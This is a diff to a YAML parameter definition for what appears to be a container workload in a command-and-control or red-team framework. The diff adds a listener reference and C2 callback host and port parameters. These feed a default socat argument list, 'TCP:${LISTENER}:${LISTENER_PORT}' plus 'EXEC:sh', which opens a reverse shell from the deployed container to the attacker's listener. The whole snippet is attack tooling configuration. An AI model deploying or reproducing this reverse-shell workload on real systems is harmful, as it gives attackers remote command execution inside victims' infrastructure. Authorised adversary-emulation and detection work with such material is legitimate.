@@ -18,6 +18,18 @@ parameters:
     type: string
     default: alpine/socat
     description: the image used by the workload
+  LISTENER_REF:
+    type: Listener
+    required: true
+    description: the active listener to connect to; its C2 host address and port ground the Arguments default
+  LISTENER:
+    type: string
+    default: ${LISTENER}
+    description: callback host derived from LISTENER_REF unless explicitly supplied
+  LISTENER_PORT:
+    type: int
+    default: ${LISTENER_PORT}
+    description: callback port derived from LISTENER_REF unless explicitly supplied
   Arguments:
     type: stringList
     default: '["TCP:${LISTENER}:${LISTENER_PORT}", "EXEC:sh"]'
